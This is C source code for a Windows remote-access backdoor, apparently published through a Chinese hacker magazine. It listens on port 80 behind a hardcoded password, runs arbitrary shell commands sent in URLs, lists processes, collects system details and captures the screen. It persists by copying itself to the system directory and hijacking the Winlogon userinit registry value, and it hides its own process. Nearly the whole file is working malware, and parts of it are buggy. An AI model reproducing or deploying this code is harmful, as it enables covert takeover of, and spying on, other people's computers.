#include<WINSOCK2.h>
#include<stdio.h>
#include<stdlib.h>
#include<time.h>

#pragma comment(lib,"Ws2_32")
#include <mmsystem.h>
#include <TLHELP32.H>
#include "HideProcess.h"

#define MAXDATASIZE 4096
#define BUFFER_SIZE 1024
//////////////////////////////////////////
#define  ERROR      0
#define  PSLIST     1
#define  SYSINFO    2
#define  PASSWDOK   3
#define  PASSWDERROR   4
#define  CMDERROR   5
#define  CMD        6
#define  SCREEM     7
#define  INSTALL    8
/////////////////////////////////////////
//服务器默认端口
#define PORT 80
/////////////////////////////
void DealWithGet(SOCKET s);
char * GetStr(char *buff,char *frist,char *last);
int  GetCmd(char *buff);
BOOL SendToIE(SOCKET s, char *data);
void getCurrentTime(char timeBuf[]);
void pslist(SOCKET s);
void sysinfo(SOCKET s);
void cmdshell(SOCKET s);
BOOL CapScreen(LPTSTR FileName);
int  sendfile(SOCKET s ,char *filename);
HANDLE DDBtoDIB( HBITMAP bitmap, DWORD dwCompression, HPALETTE  hPal,DWORD * sizeimage);
void autorun();
//////////////////////////
//客户机请求信息
const char * PASSWD = "123456";
char buffer[BUFFER_SIZE];//保存用户请求
char buf[BUFFER_SIZE];
//int  DataLength;//信息长度
short requestCMD;//请求头
char Time[26];
///////////////////////////////////////

void autorun()
{
	char ExeFile[MAX_PATH]; 
	char TempPath[MAX_PATH];
	char regname[MAX_PATH]="userinit.exe,http.exe";
	
	GetModuleFileName(NULL,ExeFile,MAX_PATH);
	GetSystemDirectory(TempPath ,MAX_PATH);
	strcat(TempPath,"\\http.exe");
	CopyFile(ExeFile, TempPath, FALSE);
	HKEY key;
	if( RegOpenKeyEx( HKEY_LOCAL_MACHINE,
               "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
               0, KEY_ALL_ACCESS, &key ) == ERROR_SUCCESS)
	{
		    RegSetValueEx(key,"userinit",0,REG_SZ,(BYTE *)regname,lstrlen(regname)); 
            RegCloseKey(key); 
	}
}

BOOL SendToIE(SOCKET s, char *data)
{
	char buffer[MAXDATASIZE+200];
	char html[MAXDATASIZE];
//	DWORD bufferLen;
   //数据简单的按HTML文件格式化，
	sprintf(html,"<html>\r\n"\
                 "<head>\r\n"\
                 "<title>天涯浪人后门测试--黑客防线</title>\r\n"\
                 "<meta name='GENERATOR' content='Microsoft FrontPage 3.0'>\r\n"\
                 "</head>\r\n"\
				 "<body>%s</body>\r\n" 
				 "<center><font color='#DC143C'>天涯浪人后门 QQ：6354365 黑客防线专版</font><center>\r\n"\
				 "</html>\r\n"\
                 ,data);
	               getCurrentTime(Time); 
	//数据HTTP打包，加上response头，格式固定，很简单
	sprintf(buffer, "HTTP/1.1 200 OK\r\n"\
					"Server: Microsoft-IIS/5.0\r\n"\
					"Date: %s\r\n"\
					"Content-Length: %d\r\n"\
					"Content-Type: text/html\r\n"\
					"Cache-control: private\r\n\r\n"\
					"%s\r\n"
					,Time, strlen(html), html);

//	bufferLen = (DWORD)strlen(buffer);
	send(s,buffer, (DWORD)strlen(buffer),0);
    printf("##senddata:\r\n%s",buffer);
	return true;
}

void DealWithGet(SOCKET s)
{
    if((buf[0]=='G'||buf[0]=='g')&&(buf[1]=='E'||buf[1]=='e')&&(buf[2]=='T'||buf[2]=='t'))
	{
		   if(buf[5]==' ')
		   {
			   SendToIE(s, "<center><font color='#DC143C'>没有命令!</font><\center>\r\n");
		   }
		   else
		   {
			   char *pass = NULL;
			   char *cmd = NULL;
			   char SysPath[MAX_PATH] ={0};
			   if(strstr(buf,"PASS=")==NULL||strstr(buf,"&")==NULL||strstr(buf,">")==NULL||strstr(buf,"cmd")==NULL)
			   {
				   SendToIE(s, "<center><font color='#DC143C'>天涯浪人B/S后门测试!</font><\center>\r\n");
			   }else
			   {
				   pass = GetStr(buf,"PASS=","&"); //这里判断GET请求的内容，
		//		   printf("pass:%s\r\n",pass);
			       if(strcmp(pass,PASSWD)==0)
				   {				   
					   switch(requestCMD = GetCmd(buf))
					   {
					   case PSLIST:
						   pslist(s);
						   break;				   
					   case SYSINFO:					   
						   sysinfo(s);					   
						   break;				   
					   case CMDERROR:					   
						   SendToIE(s, "CMDERROR\r\n");					   
						   break;				   
					   case SCREEM:					   
						   GetSystemDirectory(SysPath,MAX_PATH);					   
						   strcat(SysPath,"\\screem.dat");					   
						   CapScreen(SysPath);					   
						   sendfile(s ,SysPath);					   
						   break;				   
					   case ERROR:					  
						   SendToIE(s, "ERROR\r\n");					 
						   break;				  
					   case CMD:				
						   cmdshell(s);
						   break;
					   case INSTALL:
						   autorun();
						   break;				  
					   }			   
				   }			 
				   else			 
				   {			
					   SendToIE(s, "<center><font color='#DC143C'>密码错误!<br>请输入:般若波罗蜜！</font><\center>\r\n");			  
				   }			  
			   }		   
		   }
	}
	else
	{
		SendToIE(s, "<center><font color='#DC143C'>不是GET方法!</font><\center>\r\n");
	}
 
}
//////////////////////////////////
//解析请求
char * GetStr(char *buff,char *frist,char *last)
{
	char temp[1024] = {0};
	char * F = NULL; 
    char * L = NULL; 
	char *re = NULL;
	if(strstr(buff,frist)==NULL||strstr(buff,last)==NULL)
	{
		return NULL;
	}
    F = strstr(buff,frist) + strlen(frist);
	L = strstr(buff,last);
    memset(temp,0,1024); 
	memcpy(temp,F,L - F); 
	return re=temp;
}

int GetCmd(char *buff)
{
	char *flag= NULL;
    char *cmd = NULL;
	char * re=NULL;
	flag = GetStr(buf,"&",">"); //这里判断GET请求的是执行CMD命令还是自定义的命令
    printf("flag:%s\r\n",flag);
	if(strcmp(flag,"cmd")==0)
	{
		return CMD;
	}
	else
	{
		if(strcmp(flag,"xcmd")==0)
		{
			re = GetStr(buf,"xcmd>"," HTTP");
			if(strcmp(re,"pslist")==0)
				return PSLIST;
			else if(strcmp(re,"sysinfo")==0)
				return SYSINFO;
			else if(strcmp(re,"viewscreem")==0)
				return SCREEM;
			else if(strcmp(re,"install")==0)
				return INSTALL;
			return CMDERROR;
		}
		else
		{
			return CMDERROR;
		}
	}	
}

void getCurrentTime(char timeBuf[])
{
 struct tm *p;
 long ltime;
 time(&ltime);
 p=localtime(&ltime);
 strftime(timeBuf,25,"%a %d %b %Y %H:%M:%S",p);
}

void pslist(SOCKET s)
{   
	char SendProStr[MAXDATASIZE] = {0};
	char buff[MAXDATASIZE] = {0};
	HANDLE hProcessSnap = NULL;
    PROCESSENTRY32 pe32= {0};
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == (HANDLE)-1)
	{
		printf("\nCreateToolhelp32Snapshot() failed:%d",GetLastError());
	}
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{	
		char a[5];
		do
		{
			itoa(pe32.th32ProcessID,a,10);
			ZeroMemory(SendProStr,MAX_PATH); 
			wsprintf(SendProStr,"<font color='#DC143C'>%d</font> ----- <font color='#000080'>%s</font><br>",
					     pe32.th32ProcessID,
					     pe32.szExeFile);
      strcat(buff,SendProStr);
		}
		while (Process32Next(hProcessSnap, &pe32));
	}
	else
	{
		printf("\nProcess32Firstt() failed:%d",GetLastError());
	}	
	SendToIE(s,buff);
	CloseHandle (hProcessSnap);
}

HANDLE DDBtoDIB( HBITMAP bitmap, DWORD dwCompression, HPALETTE  hPal,DWORD * sizeimage) 
{
    BITMAP            bm;
    BITMAPINFOHEADER    bi;
     LPBITMAPINFOHEADER     lpbi;
    DWORD            dwLen;
    HANDLE            hDib;
    HANDLE            handle;
    HDC             hdc;

    //不支持BI_BITFIELDS类型
    if( dwCompression == BI_BITFIELDS )
        return NULL;

    //如果调色板为空，则用默认调色板
    if (hPal==NULL)
        hPal = (HPALETTE) GetStockObject(DEFAULT_PALETTE );

    //获取位图信息
    GetObject(bitmap,sizeof(bm),(LPSTR)&bm);

    //初始化位图信息头
    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth        = bm.bmWidth;
    bi.biHeight         = bm.bmHeight;
    bi.biPlanes         = 1;
    bi.biBitCount        = bm.bmPlanes * bm.bmBitsPixel;
    bi.biCompression    = dwCompression;
    bi.biSizeImage        = 0;
    bi.biXPelsPerMeter    = 0;
    bi.biYPelsPerMeter    = 0;
    bi.biClrUsed        = 0;
    bi.biClrImportant    = 0;

    //计算信息头及颜色表大小
    int ncolors = (1 << bi.biBitCount); if( ncolors> 256 ) 
        ncolors = 0;
    dwLen  = bi.biSize + ncolors * sizeof(RGBQUAD);

    // we need a device context to get the dib from
    hdc = GetDC(NULL);
    hPal = SelectPalette(hdc,hPal,FALSE);
    RealizePalette(hdc);

    //为信息头及颜色表分配内存
    hDib = GlobalAlloc(GMEM_FIXED,dwLen);

    if (!hDib){
        SelectPalette(hdc,hPal,FALSE);
        ReleaseDC(NULL,hdc);
        return NULL;
    }

    lpbi = (LPBITMAPINFOHEADER)hDib;
    *lpbi = bi;
    //调用 GetDIBits 计算图像大小
    GetDIBits(hdc, bitmap, 0L, (DWORD)bi.biHeight,
            (LPBYTE)NULL, (LPBITMAPINFO)lpbi, (DWORD)DIB_RGB_COLORS );

    bi = *lpbi;
    //图像的每一行都对齐(32bit)边界
	if (bi.biSizeImage == 0){
        bi.biSizeImage = ((((bi.biWidth * bi.biBitCount) + 31) & ~31) / 8) 
                        * bi.biHeight;
    if (dwCompression != BI_RGB)
            bi.biSizeImage = (bi.biSizeImage * 3) / 2;
    }

    //重新分配内存大小，以便放下所有数据
    dwLen += bi.biSizeImage;
    if (handle = GlobalReAlloc(hDib, dwLen, GMEM_MOVEABLE))
        hDib = handle;
    else{
        GlobalFree(hDib);

        //重选原始调色板
        SelectPalette(hdc,hPal,FALSE);
        ReleaseDC(NULL,hdc);
        return NULL;
    }

    //获取位图数据
    lpbi = (LPBITMAPINFOHEADER)hDib;

    //最终获得的DIB
    BOOL bgotbits = GetDIBits( hdc, bitmap,
                  0L,                      //扫描行起始处
                (DWORD)bi.biHeight,      //扫描行数
                (LPBYTE)lpbi             //位图数据地址
                + (bi.biSize + ncolors * sizeof(RGBQUAD)),
                (LPBITMAPINFO)lpbi,      //位图信息地址
                (DWORD)DIB_RGB_COLORS);  //颜色板使用RGB

    if( !bgotbits )
    {
        GlobalFree(hDib);
        
        SelectPalette(hdc,hPal,FALSE);
        ReleaseDC(NULL,hdc);
		return NULL;
    }

    SelectPalette(hdc,hPal,FALSE);
    ReleaseDC(NULL,hdc);
	*sizeimage=bi.biSizeImage;
    return hDib;
} 

BOOL CapScreen(LPTSTR FileName)
{
	DWORD sizeimage;
	HDC hdc = CreateDC("DISPLAY", NULL, NULL, NULL); 
	HDC CompatibleHDC = CreateCompatibleDC(hdc); 
	HBITMAP BmpScreen = CreateCompatibleBitmap(hdc,GetDeviceCaps(hdc, HORZRES),GetDeviceCaps(hdc, VERTRES)); 
	SelectObject(CompatibleHDC, BmpScreen);
	BitBlt(CompatibleHDC,0,0,GetDeviceCaps(hdc, HORZRES), GetDeviceCaps(hdc, VERTRES),hdc,0,0,SRCCOPY);
	
    HANDLE	pbitmapwithoutfileh=DDBtoDIB(BmpScreen, BI_RGB,0,&sizeimage);
	BITMAPFILEHEADER bfh;
   //设置位图信息头结构
	bfh.bfType = ((WORD)('M'<< 8)|'B');
	bfh.bfReserved1 = 0;
	bfh.bfReserved2 = 0;
	bfh.bfSize = 54+sizeimage;
	bfh.bfOffBits = 54;
	//创建位图文件    
    HANDLE  hFile=CreateFile(FileName,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
    DWORD dwWrite1;
	DWORD dwWrite2;

    // 写入位图文件头
    WriteFile(hFile,&bfh,sizeof(BITMAPFILEHEADER),&dwWrite1,NULL);
    // 写入位图文件其余内容
    WriteFile(hFile,pbitmapwithoutfileh,bfh.bfSize,&dwWrite2,NULL);  
    DeleteDC(hdc);
    CloseHandle(hFile);
    CloseHandle(CompatibleHDC);
               
    return true;
}


int sendfile(SOCKET s ,char *filename)
{
	char sendbuf[1024];//发送缓冲区
	//DWORD dwFileSize;//文件大小
	DWORD        dwRead;
    BOOL         bRet;
//    char filename[]="c:\\MyMain.java";
	HANDLE hFile=CreateFile(filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	//dwFileSize=GetFileSize(hFile,NULL);
	while(true)
    {
      bRet=ReadFile(hFile,sendbuf,1024,&dwRead,NULL);
      if(bRet==FALSE)
      {
		printf("Read Buf ERROR!\r\n");
        break;
      }
      else if(dwRead==0)
      {
		printf("Send file OK!\r\n");
		send(s,"\r\n\r\n\r\n",sizeof("\r\n\r\n\r\n"),0);
        break;
      }
      else
      {
       send(s,sendbuf,dwRead,0);
      }
    };
    CloseHandle(hFile);
	return 1;
}



DWORD GetOS() 
{ 
    OSVERSIONINFO os; 
    os.dwOSVersionInfoSize=sizeof(OSVERSIONINFO); 
    GetVersionEx(&os); 
    switch(os.dwPlatformId) 
	{ 
    case VER_PLATFORM_WIN32_WINDOWS: 
    return VER_PLATFORM_WIN32_WINDOWS; 
  
    case VER_PLATFORM_WIN32_NT: 
    return VER_PLATFORM_WIN32_NT; 
	} 
    return 0;
}
 
void sysinfo(SOCKET s)
{
	
        TCHAR szBuff[MAXDATASIZE] = {0}; 
        TCHAR szTemp[MAXDATASIZE] = {0}; 
		TCHAR Buff[MAXDATASIZE] = {0};
        wsprintf(szBuff,"<font color='#Df14fC'>System Information:</font><br><br>"); 
    	strcpy(Buff,szBuff);
        DWORD len=sizeof(szTemp); 
        GetComputerName(szTemp,&len); 
        wsprintf(szBuff,"<font color='#DC143C'>Computer Name: %s</font><br><br>",szTemp); 

		strcat(Buff,szBuff);
        switch(GetOS()) 
		{ 
          case VER_PLATFORM_WIN32_WINDOWS: 
          lstrcpy(szTemp,"Windows 9x"); 
          break; 
          case VER_PLATFORM_WIN32_NT: 
          lstrcpy(szTemp,"Windows NT/2000"); 
          break; 
		} 

         wsprintf(szBuff,"<font color='#000080'>Option System: %s</font><br><br>",szTemp); 
		 strcat(Buff,szBuff);
         MEMORYSTATUS mem; 
         mem.dwLength=sizeof(mem); 
         GlobalMemoryStatus(&mem); 
         wsprintf(szBuff,"<font color='#000080'>Total Memroy: %dM</font><br><br>",mem.dwTotalPhys/1024/1024+1); 
		 strcat(Buff,szBuff); 
         TCHAR szPath[MAX_PATH]; 
         GetWindowsDirectory(szTemp,sizeof(szTemp)); 
         GetSystemDirectory(szBuff,sizeof(szBuff)); 
         wsprintf(szPath,"<font color='#0ff080'>Windows Directory:</font> <font color='#0ff080'>%s</font><br><br><font color='#0ff080'>System Directory: %s</font><br><br>",szTemp,szBuff); 
		 strcat(Buff,szPath);
         TCHAR szFileSys[10]; 

        for(int i=0;i<26;++i) 
		{ 
          wsprintf(szTemp,"%c:\\",'A'+i); 
          UINT uType=GetDriveType(szTemp); 
          switch(uType) 
		{ 
           case DRIVE_FIXED: 
           GetVolumeInformation(szTemp,NULL,NULL,NULL,NULL,NULL,szFileSys,MAX_PATH); 
           wsprintf(szBuff,"<font color='#340080'>Hard Disk: %s (%s)</font><br><br>",szTemp,szFileSys); 
		   strcat(Buff,szBuff);
           break; 
           case DRIVE_CDROM: 
           wsprintf(szBuff,"<font color='#h0d080'>CD-ROM Disk: %s</font><br><br>",szTemp); 
           break; 
           case DRIVE_REMOTE: 
           GetVolumeInformation(szTemp,NULL,NULL,NULL,NULL,NULL,szFileSys,MAX_PATH); 
           wsprintf(szBuff,"<font color='#af00080'>NetWork Disk: %s (%s)</font><br><br>",szTemp,szFileSys); 
		   strcat(Buff,szBuff);
          break; 
          } 
         } 
		SendToIE(s,Buff);		 
}

void cmdshell(SOCKET s)
{
	char * ret1=NULL;
	char  ret2[1024]={0};
	SECURITY_ATTRIBUTES pipeattr1;
	HANDLE hReadPipe1,hWritePipe1;
	//建立匿名管道1
	pipeattr1.nLength = 12; 
	pipeattr1.lpSecurityDescriptor = 0;
	pipeattr1.bInheritHandle = true;
	CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0);
		
	STARTUPINFO si;
	ZeroMemory(&si,sizeof(si));
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	//si.hStdInput = hReadPipe2;
	si.hStdOutput = si.hStdError = hWritePipe1;
	PROCESS_INFORMATION ProcessInformation;

	char cmdLine[200];
	unsigned long lBytesRead;
	char temp[MAXDATASIZE] = {0};		
	ret1 = GetStr(buf,">"," HTTP");		
	char gcmd[5][1024]={0};                   		
	char *token;		
	int n = 0;
	token = strtok( ret1, "%20" ); 					
	while( token != NULL ) 		
	{ 	  
		strcpy(&gcmd[n][1024],token);    
		token = strtok( NULL, "%20" );	  
		n++;		  		
	}	
	int k=1;	
	while(k<=n)
	{		
		strcat(ret2,gcmd[k]);	
		strcat(ret2," ");	
		k++;	
	}
	strcpy(cmdLine, "cmd.exe /c ");		
 	strncat(cmdLine, ret2, strlen(ret2));
	//以命令为参数，启动cmd执行
	CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	Sleep(400);		
    int	ret=PeekNamedPipe(hReadPipe1,buf,1024,&lBytesRead,0,0);
 	if(lBytesRead)
	{
	//管道1有输出，读出结果发给远程客户机
		ret=ReadFile(hReadPipe1,buf,lBytesRead,&lBytesRead,0);         
		int i,j,len;
		len =strlen(buf);				 			
		j = 0;			
		for(i=0;i<len+1;i++)			
		{			
			if(buf[i]!='\n')			
			{			
				temp[j] = buf[i];			
			}			
			else			
			{			
				temp[j] ='<';			
				temp[j+1] ='b';						
				temp[j+2] ='r';			
				temp[j+3] ='>';			
				j = j+3;			
			}			
			j++;			
		}			
		temp[j] = '\0';			
		SendToIE(s,temp);				 			
		memset(buf,0,sizeof(buf));				
		memset(temp,0,sizeof(temp));		
	}
}

void main()
{
	WSADATA wsaData;
    SOCKET Listen,Accept;
    struct sockaddr_in Http_Server,client;
	if(WSAStartup(MAKEWORD(2,2),&wsaData)!=0)
	{
		printf("无法加载套接字协议栈\n");
		return ;
	}
	Listen=socket(AF_INET,SOCK_STREAM,0);
	if(Listen==INVALID_SOCKET)
	{
		printf("套接字初始化出现错误；错误号：");
		return ;
	}
	Http_Server.sin_family=AF_INET;
	Http_Server.sin_port=htons(PORT);
    Http_Server.sin_addr.s_addr=htonl(INADDR_ANY);
    if(bind(Listen,(LPSOCKADDR)&Http_Server,sizeof(Http_Server))==SOCKET_ERROR)
	{
		printf("绑定出现问题:");
		return ;
	}
    if(listen(Listen,5)==SOCKET_ERROR)
	{
		printf("监听出现问题错误号码:");
		return ;
	}
	int iAddrSize=sizeof(client);
    HideProcess();
    printf("*********************************************\n");
    printf("程序已启动.......\n");
    printf("*********************************************\n");

    while(true)
	{
		Accept=accept(Listen,(struct sockaddr*)&client,&iAddrSize);
		if(Accept==INVALID_SOCKET)
		{
			printf("连接出现错误代码: ");
            break;
		}
		getCurrentTime(Time);
		printf("%s客户机请求时间   \n",Time);
        recv(Accept,buffer,sizeof(buf),0);
		int  i=0;
		printf("\n请求的客户IP地址为:[%s],端口号:[%d]\n",inet_ntoa(client.sin_addr),ntohs(client.sin_port));   

		while(buffer[i]!='\n')
		{
			buf[i] = buffer[i];
			printf("%c",buf[i]); 
			i++; 
		} 
		buf[i]='\0';

		DealWithGet(Accept);      

		closesocket(Accept);

	}
	closesocket(Listen);
	WSACleanup();
}